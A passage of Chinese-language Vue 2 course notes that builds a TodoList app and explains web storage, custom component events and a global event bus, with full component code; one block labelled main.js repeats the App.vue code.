				:checkAllTodo="checkAllTodo"
				:clearAllTodo="clearAllTodo"
			></MyFooter>
		</div>
	</div>
</template>

<script>
import MyHeader from "./components/MyHeader.vue";
import MyFooter from "./components/MyFooter.vue";
import MyList from "./components/MyList.vue";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			todos: [
				{ id: "001", title: "抽烟", done: true },
				{ id: "002", title: "喝酒", done: false },
				{ id: "003", title: "开车", done: true },
			],
		};
	},
	methods: {
		// 添加一个todo
		// 注意，此处函数名不可与MyHeader中已定义的函数名相同
		addTodo(todoObj) {
			this.todos.unshift(todoObj);
		},
		// 勾选or取消勾选一个todo
		checkTodo(id) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		// 删除一个todo
		deleteTodo(id) {
			this.todos = this.todos.filter((todo) => todo.id !== id);
		},
		// 全选or取消全选
		checkAllTodo(done) {
			this.todos.forEach((todo) => {
				todo.done = done;
			});
		},
		// 清除所有已经完成的todo
		clearAllTodo() {
			this.todos = this.todos.filter((todo) => {
				return !todo.done;
			});
		},
	},
};
</script>

<style>
/*base*/
body {
	background: #fff;
}

.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}

.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}

.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}

.btn:focus {
	outline: none;
}

/*app*/
.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>

```

> 注意此处不可以Header、Footer命名。
- MyHeader.vue
```html
<template>
	<div class="todo-header">
		<input
			type="text"
			placeholder="请输入你的任务名称，按回车键确认"
			@keyup.enter="add"
			v-model="title"
		/>
	</div>
</template>

<script>
import { nanoid } from "nanoid";
export default {
	name: "MyHeader",
	props: ["addTodo"],
	data() {
		return {
			title: "",
		};
	},
	methods: {
		add(e) {
			// 1.校验数据
			if (!this.title.trim()) return alert("输入不能为空");
			// 2.将用户的输入包装成一个todo对象
			// uuid->精简版nanoid
			const todoObj = { id: nanoid(), title: this.title, done: false };
			// 3.通知App组件去添加一个todo对象
			this.addTodo(todoObj);
			this.title = "";
		},
	},
};
</script>

<style scoped>
/*header*/
.todo-header input {
	width: 560px;
	height: 28px;
	font-size: 14px;
	border: 1px solid #ccc;
	border-radius: 4px;
	padding: 4px 7px;
}

.todo-header input:focus {
	outline: none;
	border-color: rgba(82, 168, 236, 0.8);
	box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
		0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```
- MyFooter.vue
```html
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- <input type="checkbox" :checked="isAll" @change="checkAll" /> -->
			<!-- 此处可改为以下写法 -->
			<!-- 此处isAll不是prop，所以跟MyItem中的不同 -->
			<input type="checkbox" v-model="isAll" />
		</label>
		<span>
			<span>已完成{{ doneTotal }}</span> / 全部{{ total }}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
export default {
	name: "MyFooter",
	props: ["todos", "checkAllTodo", "clearAllTodo"],
	computed: {
		doneTotal() {
			/* let i = 0;
			this.todos.forEach((todo) => {
				if (todo.done) i++;
			});
			return i; */
			// reduce:数组有几个数调用几次。若函数第二个参数有值，则第一次调用时pre为此值，之后为前一次调用时的return值。最后的返回值为整个函数的返回值。
			return this.todos.reduce((pre, todo) => pre + (todo.done ? 1 : 0), 0);
		},
		total() {
			return this.todos.length;
		},
		/* isAll() {
			return this.doneTotal === this.total && this.total > 0;
		}, */
		isAll: {
			get() {
				return this.doneTotal === this.total && this.total > 0;
			},
			set(value) {
				this.checkAllTodo(value);
			},
		},
	},
	methods: {
		checkAll(e) {
			this.checkAllTodo(e.target.checked);
		},
		clearAll() {
			this.clearAllTodo();
		},
	},
};
</script>

<style scoped>
/*footer*/
.todo-footer {
	height: 40px;
	line-height: 40px;
	padding-left: 6px;
	margin-top: 5px;
}

.todo-footer label {
	display: inline-block;
	margin-right: 20px;
	cursor: pointer;
}

.todo-footer label input {
	position: relative;
	top: -1px;
	vertical-align: middle;
	margin-right: 5px;
}

.todo-footer button {
	float: right;
	margin-top: 5px;
}
</style>
```
- MyList.vue
```html
<template>
	<ul class="todo-main">
		<MyItem
			v-for="todoObj in todos"
			:key="todoObj.id"
			:todo="todoObj"
			:checkTodo="checkTodo"
			:deleteTodo="deleteTodo"
		/>
	</ul>
</template>

<script>
import MyItem from "./MyItem";
export default {
	name: "MyList",
	components: { MyItem },
	props: ["todos", "checkTodo", "deleteTodo"],
};
</script>

<style scoped>
/*main*/
.todo-main {
	margin-left: 0px;
	border: 1px solid #ddd;
	border-radius: 2px;
	padding: 0px;
}

.todo-empty {
	height: 40px;
	line-height: 40px;
	border: 1px solid #ddd;
	border-radius: 2px;
	padding-left: 5px;
	margin-top: 10px;
}
</style>
```
- MyItem.vue
```html
<template>
	<li>
		<label>
			<!-- 此处还可以绑定click事件 -->
			<!-- 此处还可以按如下写法通过双向数据绑定进行书写，则不需要获取父类数据等行为。但违背了props的只读原则。能成功的原因是因为此处修改的是对象中的某一个属性，vue监测不到，vue只能监测到修改整个对象的情况 -->
			<!-- <input type="checkbox" v-model="todo.done" /> -->
			<input
				type="checkbox"
				:checked="todo.done"
				@change="handleCheck(todo.id)"
			/>
			<span>{{ todo.title }}</span>
		</label>
		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
	</li>
</template>

<script>
export default {
	name: "MyItem",
	// 声明接收todo对象
	props: ["todo", "checkTodo", "deleteTodo"],
	methods: {
		// 勾选or取消勾选
		handleCheck(id) {
			// 通知App组件将对应的todo对象的done值取反
			this.checkTodo(id);
		},
		// 删除
		handleDelete(id) {
			if (confirm("确定删除吗？")) {
				this.deleteTodo(id);
			}
		},
	},
};
</script>

<style scoped>
/*item*/
li {
	list-style: none;
	height: 36px;
	line-height: 36px;
	padding: 0 5px;
	border-bottom: 1px solid #ddd;
}

li label {
	float: left;
	cursor: pointer;
}

li label li input {
	vertical-align: middle;
	margin-right: 6px;
	position: relative;
	top: -1px;
}

li button {
	float: right;
	display: none;
	margin-top: 3px;
}

li:before {
	content: initial;
}

li:last-child {
	border-bottom: none;
}

li:hover {
	background-color: #ddd;
}

li:hover button {
	display: block;
}
</style>
```

## webStorage
1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

    1. ```xxxxxStorage.setItem('key', 'value');```
        				该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

    2. ```xxxxxStorage.getItem('person');```

        ​		该方法接受一个键名作为参数，返回键名对应的值。

    3. ```xxxxxStorage.removeItem('key');```

        ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

    4. ```xxxxxStorage.clear()```

        ​		该方法会清空存储中的所有数据。

4. 备注：

    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. ```JSON.parse(null)```的结果依然是null。

- localStorage
```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <!-- 浏览器关闭，仍然保存 -->
    <title>localStorage</title>
</head>

<body>
    <h2>localStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我读取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="deleteAllData()">点我清空数据</button>
    <script type="text/javascript">
        let p = { name: '张三', age: 18 }

        function saveData() {
            // window.localStorage
            // setItem('key','value') 注意此处的key和value都得是字符串
            localStorage.setItem('msg', 'hello!')
            localStorage.setItem('person', JSON.stringify(p))
        }
        function readData() {
            console.log(localStorage.getItem('msg'))

            const result = localStorage.getItem('person')   // 注意：读取一个不存在的数据会返回null
            console.log(JSON.parse(result)) // JSON.parse(null)返回的还是null
        }
        function deleteData() {
            localStorage.removeItem('msg')
        }
        function deleteAllData() {
            localStorage.clear()
        }
    </script>
</body>

</html>
```

- sessionStorage
```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <!-- 浏览器一关，sessionStorage就会删除 -->
    <title>sessionStorage</title>
</head>

<body>
    <h2>sessionStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我读取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="deleteAllData()">点我清空数据</button>
    <script type="text/javascript">
        let p = { name: '张三', age: 18 }

        function saveData() {
            // window.sessionStorage
            // setItem('key','value') 注意此处的key和value都得是字符串
            sessionStorage.setItem('msg', 'hello!')
            sessionStorage.setItem('person', JSON.stringify(p))
        }
        function readData() {
            console.log(sessionStorage.getItem('msg'))

            const result = sessionStorage.getItem('person')   // 注意：读取一个不存在的数据会返回null
            console.log(JSON.parse(result)) // JSON.parse(null)返回的还是null
        }
        function deleteData() {
            sessionStorage.removeItem('msg')
        }
        function deleteAllData() {
            sessionStorage.clear()
        }
    </script>
</body>

</html>
```

## 将本地存储运用到TodoList中
```html
<template>
	<div class="todo-container">
		<div class="todo-wrap">
			<MyHeader :addTodo="addTodo"></MyHeader>
			<MyList
				:todos="todos"
				:checkTodo="checkTodo"
				:deleteTodo="deleteTodo"
			></MyList>
			<MyFooter
				:todos="todos"
				:checkAllTodo="checkAllTodo"
				:clearAllTodo="clearAllTodo"
			></MyFooter>
		</div>
	</div>
</template>

<script>
import MyHeader from "./components/MyHeader.vue";
import MyFooter from "./components/MyFooter.vue";
import MyList from "./components/MyList.vue";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			todos: JSON.parse(localStorage.getItem("todos")) || [],
		};
	},
	methods: {
		// 添加一个todo
		// 注意，此处函数名不可与MyHeader中已定义的函数名相同
		addTodo(todoObj) {
			this.todos.unshift(todoObj);
		},
		// 勾选or取消勾选一个todo
		checkTodo(id) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		// 删除一个todo
		deleteTodo(id) {
			this.todos = this.todos.filter((todo) => todo.id !== id);
		},
		// 全选or取消全选
		checkAllTodo(done) {
			this.todos.forEach((todo) => {
				todo.done = done;
			});
		},
		// 清除所有已经完成的todo
		clearAllTodo() {
			this.todos = this.todos.filter((todo) => {
				return !todo.done;
			});
		},
	},
	watch: {
		todos: {
			deep: true,
			handler(value) {
				localStorage.setItem("todos", JSON.stringify(value));
			},
		},
	},
};
</script>

<style>
/*base*/
body {
	background: #fff;
}

.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}

.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}

.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}

.btn:focus {
	outline: none;
}

/*app*/
.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>

```

## 自定义事件
1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

    1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```或 ```<Demo v-on:atguigu="test"/>```

    2. 第二种方式，在父组件中：

        ```js
        <Demo ref="demo"/>
        ......
        mounted(){
           this.$refs.xxx.$on('atguigu',this.test)
        }
        ```

    3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！


- main.js
```js
<template>
	<div class="app">
		<h1>{{ msg }},学生姓名是：{{ studentName }}</h1>
		<!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
		<School :getSchoolName="getSchoolName" />
		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据 -->
		<!-- <Student v-on:atguigu="getStudentName" /> -->
		<!-- 方法一：(使用@或v-on) -->
		<!-- <Student @:atguigu.once="getStudentName" /> -->

		<!-- 方法二：(使用ref加mounted,此种方式更灵活) -->
		<!-- <Student ref="student" @demo="m1" /> -->

		<!-- 此处加.native修饰符，表明此处的click是原生事件，不是自定义事件 -->
		<Student ref="student" @click.native="show" />
	</div>
</template>

<script>
import Student from "./components/Student.vue";
import School from "./components/School.vue";
export default {
	name: "App",
	components: { Student, School },
	data() {
		return {
			msg: "你好啊!",
			studentName: "",
		};
	},
	methods: {
		getSchoolName(name) {
			console.log("App收到了学校名：", name);
		},
		getStudentName(name, ...params) {
			console.log("App收到了学生名：", name, params); //App收到了学生名： XXC  [666, 888, 999]
			this.studentName = name;
		},
		m1() {
			console.log("demo事件被触发了");
		},
		show() {
			alert(123);
		},
	},
	mounted() {
		// setTimeout(() => {
		// 推荐写法！！！
		this.$refs.student.$on("atguigu", this.getStudentName); // 绑定自定义事件，此处vue承诺如果getStuedntName是定义在methods中的函数，则this是当前组件对象
		// this指向事件调用组件情况
		/* this.$refs.student.$on("atguigu", function (name, ...params) {
				console.log("App收到了学生名：", name, params); //App收到了学生名： XXC  [666, 888, 999]
				// this.studentName = name;
				console.log(this); // 此处输出的是触发atguigu事件的组件，但若写成如下箭头函数形式，则仍然是当前组件对象
			}); */
		// 通过箭头函数修复this写法
		/* this.$refs.student.$on("atguigu", (name, ...params) => {
			console.log("App收到了学生名：", name, params); //App收到了学生名： XXC  [666, 888, 999]
			this.studentName = name;
			console.log(this);
		}); */
		// }, 3000);
		// 绑定自定义事件（一次性）
		// this.$refs.student.$once('atguigu',this.getStudentName)
	},
};
</script>

<style>
.app {
	background-color: gray;
	padding: 5px;
}
</style>

```

- App.vue
```html
<template>
	<div class="app">
		<h1>{{ msg }},学生姓名是：{{ studentName }}</h1>
		<!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
		<School :getSchoolName="getSchoolName" />
		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据 -->
		<!-- <Student v-on:atguigu="getStudentName" /> -->
		<!-- 方法一：(使用@或v-on) -->
		<!-- <Student @:atguigu.once="getStudentName" /> -->

		<!-- 方法二：(使用ref加mounted,此种方式更灵活) -->
		<!-- <Student ref="student" @demo="m1" /> -->

		<!-- 此处加.native修饰符，表明此处的click是原生事件，不是自定义事件 -->
		<Student ref="student" @click.native="show" />
	</div>
</template>

<script>
import Student from "./components/Student.vue";
import School from "./components/School.vue";
export default {
	name: "App",
	components: { Student, School },
	data() {
		return {
			msg: "你好啊!",
			studentName: "",
		};
	},
	methods: {
		getSchoolName(name) {
			console.log("App收到了学校名：", name);
		},
		getStudentName(name, ...params) {
			console.log("App收到了学生名：", name, params); //App收到了学生名： XXC  [666, 888, 999]
			this.studentName = name;
		},
		m1() {
			console.log("demo事件被触发了");
		},
		show() {
			alert(123);
		},
	},
	mounted() {
		// setTimeout(() => {
		// 推荐写法！！！
		this.$refs.student.$on("atguigu", this.getStudentName); // 绑定自定义事件，此处vue承诺如果getStuedntName是定义在methods中的函数，则this是当前组件对象
		// this指向事件调用组件情况
		/* this.$refs.student.$on("atguigu", function (name, ...params) {
				console.log("App收到了学生名：", name, params); //App收到了学生名： XXC  [666, 888, 999]
				// this.studentName = name;
				console.log(this); // 此处输出的是触发atguigu事件的组件，但若写成如下箭头函数形式，则仍然是当前组件对象
			}); */
		// 通过箭头函数修复this写法
		/* this.$refs.student.$on("atguigu", (name, ...params) => {
			console.log("App收到了学生名：", name, params); //App收到了学生名： XXC  [666, 888, 999]
			this.studentName = name;
			console.log(this);
		}); */
		// }, 3000);
		// 绑定自定义事件（一次性）
		// this.$refs.student.$once('atguigu',this.getStudentName)
	},
};
</script>

<style>
.app {
	background-color: gray;
	padding: 5px;
}
</style>

```

- Student.vue
```html
<template>
	<div class="student">
		<h2>学生姓名：{{ name }}</h2>
		<h2>学生性别：{{ sex }}</h2>
		<h2>当前求和为：{{ number }}</h2>
		<button @click="add">点我number++</button>
		<button @click="sendStudentName">把学生名给App</button>
		<button @click="unbind">解绑atguigu事件</button>
		<button @click="death">销毁当前Student组件的实例(vc)</button>
	</div>
</template>

<script>
export default {
	name: "Student",
	data() {
		return {
			name: "XXC",
			sex: "男",
			number: 0,
		};
	},
	methods: {
		add() {
			console.log("add回调被调用了");
			this.number++;
		},
		sendStudentName() {
			// 触发Student组件实例身上的atguigu事件
			this.$emit("atguigu", this.name, 666, 888, 999);
			// this.$emit("demo");
		},
		unbind() {
			this.$off("atguigu"); // 解绑一个自定义事件
			// this.$off(["atguigu", "demo"]); // 解绑多个自定义事件
			// this.$off(); // 解绑所有的自定义事件
		},
		death() {
			this.$destroy(); // 销毁了当前的Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效了
		},
	},
};
</script>

<style lang="less" scoped>
.student {
	background-color: pink;
	padding: 5px;
	margin-top: 30px;
}
</style>

```

- School.vue
```html
<template>
	<div class="school">
		<h2>学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
		<button @click="sendSchoolName">把学校名给App</button>
	</div>
</template>

<script>
export default {
	name: "School",
	props: ["getSchoolName"],
	data() {
		return {
			name: "尚硅谷",
			address: "北京",
		};
	},
	methods: {
		sendSchoolName() {
			this.getSchoolName(this.name);
		},
	},
};
</script>

<style scoped>
.school {
	background-color: skyblue;
	padding: 5px;
}
</style>

```

## 将自定义事件运用到TodoList中
- App.vue
```html
<template>
	<div class="todo-container">
		<div class="todo-wrap">
			<MyHeader :addTodo="addTodo"></MyHeader>
			<MyList
				:todos="todos"
				:checkTodo="checkTodo"
				:deleteTodo="deleteTodo"
			></MyList>
			<MyFooter
				:todos="todos"
				:checkAllTodo="checkAllTodo"
				:clearAllTodo="clearAllTodo"
			></MyFooter>
		</div>
	</div>
</template>

<script>
import MyHeader from "./components/MyHeader.vue";
import MyFooter from "./components/MyFooter.vue";
import MyList from "./components/MyList.vue";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			todos: JSON.parse(localStorage.getItem("todos")) || [],
		};
	},
	methods: {
		// 添加一个todo
		// 注意，此处函数名不可与MyHeader中已定义的函数名相同
		addTodo(todoObj) {
			this.todos.unshift(todoObj);
		},
		// 勾选or取消勾选一个todo
		checkTodo(id) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		// 删除一个todo
		deleteTodo(id) {
			this.todos = this.todos.filter((todo) => todo.id !== id);
		},
		// 全选or取消全选
		checkAllTodo(done) {
			this.todos.forEach((todo) => {
				todo.done = done;
			});
		},
		// 清除所有已经完成的todo
		clearAllTodo() {
			this.todos = this.todos.filter((todo) => {
				return !todo.done;
			});
		},
	},
	watch: {
		todos: {
			deep: true,
			handler(value) {
				localStorage.setItem("todos", JSON.stringify(value));
			},
		},
	},
};
</script>

<style>
/*base*/
body {
	background: #fff;
}

.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}

.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}

.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}

.btn:focus {
	outline: none;
}

/*app*/
.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>

```

- MyFooter.vue
```html
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- <input type="checkbox" :checked="isAll" @change="checkAll" /> -->
			<!-- 此处可改为以下写法 -->
			<!-- 此处isAll不是prop，所以跟MyItem中的不同 -->
			<input type="checkbox" v-model="isAll" />
		</label>
		<span>
			<span>已完成{{ doneTotal }}</span> / 全部{{ total }}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
export default {
	name: "MyFooter",
	props: ["todos", "checkAllTodo", "clearAllTodo"],
	computed: {
		doneTotal() {
			/* let i = 0;
			this.todos.forEach((todo) => {
				if (todo.done) i++;
			});
			return i; */
			// reduce:数组有几个数调用几次。若函数第二个参数有值，则第一次调用时pre为此值，之后为前一次调用时的return值。最后的返回值为整个函数的返回值。
			return this.todos.reduce((pre, todo) => pre + (todo.done ? 1 : 0), 0);
		},
		total() {
			return this.todos.length;
		},
		/* isAll() {
			return this.doneTotal === this.total && this.total > 0;
		}, */
		isAll: {
			get() {
				return this.doneTotal === this.total && this.total > 0;
			},
			set(value) {
				this.checkAllTodo(value);
			},
		},
	},
	methods: {
		checkAll(e) {
			this.checkAllTodo(e.target.checked);
		},
		clearAll() {
			this.clearAllTodo();
		},
	},
};
</script>

<style scoped>
/*footer*/
.todo-footer {
	height: 40px;
	line-height: 40px;
	padding-left: 6px;
	margin-top: 5px;
}

.todo-footer label {
	display: inline-block;
	margin-right: 20px;
	cursor: pointer;
}

.todo-footer label input {
	position: relative;
	top: -1px;
	vertical-align: middle;
	margin-right: 5px;
}

.todo-footer button {
	float: right;
	margin-top: 5px;
}
</style>
```

- MyHeader.vue
```html
<template>
	<div class="todo-header">
		<input
			type="text"
			placeholder="请输入你的任务名称，按回车键确认"
			@keyup.enter="add"
			v-model="title"
		/>
	</div>
</template>

<script>
import { nanoid } from "nanoid";
export default {
	name: "MyHeader",
	props: ["addTodo"],
	data() {
		return {
			title: "",
		};
	},
	methods: {
		add(e) {
			// 1.校验数据
			if (!this.title.trim()) return alert("输入不能为空");
			// 2.将用户的输入包装成一个todo对象
			// uuid->精简版nanoid
			const todoObj = { id: nanoid(), title: this.title, done: false };
			// 3.通知App组件去添加一个todo对象
			this.addTodo(todoObj);
			this.title = "";
		},
	},
};
</script>

<style scoped>
/*header*/
.todo-header input {
	width: 560px;
	height: 28px;
	font-size: 14px;
	border: 1px solid #ccc;
	border-radius: 4px;
	padding: 4px 7px;
}

.todo-header input:focus {
	outline: none;
	border-color: rgba(82, 168, 236, 0.8);
	box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
		0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```

## 全局事件总线

> 前提：1.所有组件都能看到的一个组件，2.可以调用到$on、$off、$emit

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

- main.js
```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

// 为何不能写成VueComponent.prototype.x=？（为什么不能将VueComponent原型作为挂载对象？）
// 1.首先无法直接写VueComponent，因为它不是我们自己定义的。而是extend函数为我们定义的
// 2.其次，每次extend函数生成的VueComponent函数都不一样。除非修改源码，在每次生成的VueComponent的原型上都添加事件总线（但不推荐）

// 尝试将vc挂载到Vue原型上--> 可行，但过于麻烦
const Demo = Vue.extend({})
const d = new Demo()
Vue.prototype.x = d

//创建vm
new Vue({
	el: '#app',
	render: h => h(App),
	// 写到beforeCreate中的原因：在数据渲染前挂载。避免出现$bus未定义的情况。
	beforeCreate() {
		Vue.prototype.$bus = this //安装全局事件总线
	},
})
```

- School.vue
```html
<template>
	<div class="school">
		<h2>学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
	</div>
</template>

<script>
export default {
	name: "School",
	data() {
		return {
			name: "尚硅谷",
			address: "北京",
		};
	},
	mounted() {
		// console.log('School',this)
		this.$bus.$on("hello", (data) => {
			console.log("我是School组件，收到了数据", data);
		});
	},
	beforeDestroy() {
		// 此处必须手动销毁，因为傀儡不会随着组件销毁而被销毁
		this.$bus.$off("hello");
	},
};
</script>

<style scoped>
.school {
	background-color: skyblue;
	padding: 5px;
}
</style>
```

- Student.vue
```html
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				this.$bus.$emit('hello',this.name)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```

## 将全局事件总线运用到TodoList中
- main.js
```js
// 引入Vue
import Vue from 'vue'
// 引入App
import App from './App.vue'
// 关闭Vue的生产提示
Vue.config.productionTip = false

// 创建vm
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this
    },
})
```

- App.vue
```html
<template>
	<div class="todo-container">
		<div class="todo-wrap">
			<MyHeader @addTodo="addTodo"></MyHeader>
			<MyList :todos="todos"></MyList>
			<MyFooter
				:todos="todos"
				@checkAllTodo="checkAllTodo"
				@clearAllTodo="clearAllTodo"
			></MyFooter>
		</div>
	</div>
</template>

<script>
import MyHeader from "./components/MyHeader.vue";
import MyFooter from "./components/MyFooter.vue";
import MyList from "./components/MyList.vue";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			todos: JSON.parse(localStorage.getItem("todos")) || [],
		};
	},
	methods: {
		// 添加一个todo
		// 注意，此处函数名不可与MyHeader中已定义的函数名相同
		addTodo(todoObj) {
			this.todos.unshift(todoObj);
		},
		// 勾选or取消勾选一个todo
		checkTodo(id) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		// 删除一个todo
		deleteTodo(id) {
			this.todos = this.todos.filter((todo) => todo.id !== id);
		},
		// 全选or取消全选
		checkAllTodo(done) {
			this.todos.forEach((todo) => {
				todo.done = done;
			});
		},
		// 清除所有已经完成的todo
		clearAllTodo() {
			this.todos = this.todos.filter((todo) => {
				return !todo.done;
			});
		},
	},
	watch: {
		todos: {
			deep: true,
			handler(value) {
				localStorage.setItem("todos", JSON.stringify(value));
			},
		},
	},
	mounted() {
		this.$bus.$on("checkTodo", this.checkTodo);
		this.$bus.$on("deleteTodo", this.deleteTodo);
	},
	beforeDestroy() {
		this.$bus.$off("checkTodo");
		this.$bus.$off("deleteTodo");
	},
};
</script>

<style>
/*base*/
body {
	background: #fff;
}

.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}

.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}

.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}

.btn:focus {
	outline: none;
}

/*app*/
.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>

```

- MyItem.vue
```html
<template>
	<li>
		<label>
			<!-- <input type="checkbox" v-model="todo.done" /> -->
			<input
				type="checkbox"
				:checked="todo.done"
				@change="handleCheck(todo.id)"
			/>
			<span>{{ todo.title }}</span>
		</label>
		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
	</li>
</template>

<script>
export default {
	name: "MyItem",
	// 声明接收todo对象
	props: ["todo"],
	methods: {
		// 勾选or取消勾选
		handleCheck(id) {
			// 通知App组件将对应的todo对象的done值取反
			this.$bus.$emit("checkTodo", id);
		},
		// 删除
		handleDelete(id) {
			if (confirm("确定删除吗？")) {
				this.$bus.$emit("deleteTodo", id);
			}
		},
	},
};
</script>

<style scoped>
/*item*/
li {
	list-style: none;
	height: 36px;
	line-height: 36px;
	padding: 0 5px;
	border-bottom: 1px solid #ddd;
}

li label {
	float: left;
	cursor: pointer;
}

li label li input {
	vertical-align: middle;
	margin-right: 6px;
	position: relative;
	top: -1px;
}

li button {
	float: right;
	display: none;
	margin-top: 3px;
}

li:before {
	content: initial;
}

li:last-child {
	border-bottom: none;
}

li:hover {
	background-color: #ddd;
}

li:hover button {
	display: block;
}
</style>
```
